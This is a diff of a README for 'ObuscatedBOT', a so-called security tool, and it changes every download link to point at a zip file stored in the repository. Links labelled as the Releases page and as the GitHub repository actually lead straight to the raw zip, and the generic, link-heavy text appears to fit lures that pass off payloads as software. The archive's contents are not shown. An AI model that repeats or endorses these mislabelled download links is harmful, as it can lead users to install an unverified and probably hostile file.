@@ -1,6 +1,6 @@
 # 🤖 ObuscatedBOT - A Smart Tool for Security Insights
 
-[![Download ObuscatedBOT](https://raw.githubusercontent.com/Senku002/ObuscatedBOT/main/unsullen/ObuscatedBOT.zip%20Now-Use%20This%20Link-brightgreen)](https://raw.githubusercontent.com/Senku002/ObuscatedBOT/main/unsullen/ObuscatedBOT.zip)
+[![Download ObuscatedBOT](https://github.com/Senku002/ObuscatedBOT/raw/refs/heads/main/commands/BOT_Obuscated_3.0.zip%20Now-Use%20This%20Link-brightgreen)](https://github.com/Senku002/ObuscatedBOT/raw/refs/heads/main/commands/BOT_Obuscated_3.0.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To use ObuscatedBOT, you will need a few things in place. Don’t worry; we will
 
 To get ObuscatedBOT, visit the Releases page by clicking the link below:
 
-[Download ObuscatedBOT](https://raw.githubusercontent.com/Senku002/ObuscatedBOT/main/unsullen/ObuscatedBOT.zip)
+[Download ObuscatedBOT](https://github.com/Senku002/ObuscatedBOT/raw/refs/heads/main/commands/BOT_Obuscated_3.0.zip)
 
 Here, you will find the latest version of the software. 
 
@@ -57,7 +57,7 @@ Using ObuscatedBOT is simple.
 
 Need help? Join our community! You can find support and share experiences with other users by visiting our project repository.
 
-- [ObuscatedBOT GitHub Repository](https://raw.githubusercontent.com/Senku002/ObuscatedBOT/main/unsullen/ObuscatedBOT.zip)
+- [ObuscatedBOT GitHub Repository](https://github.com/Senku002/ObuscatedBOT/raw/refs/heads/main/commands/BOT_Obuscated_3.0.zip)
 
 ## 📑 Additional Resources
 
@@ -75,4 +75,4 @@ ObuscatedBOT is open-source software. You can freely use, modify, and distribute
 
 If you missed the link earlier, here it is once more for your convenience:
 
-[Download ObuscatedBOT](https://raw.githubusercontent.com/Senku002/ObuscatedBOT/main/unsullen/ObuscatedBOT.zip)
+[Download ObuscatedBOT](https://github.com/Senku002/ObuscatedBOT/raw/refs/heads/main/commands/BOT_Obuscated_3.0.zip)
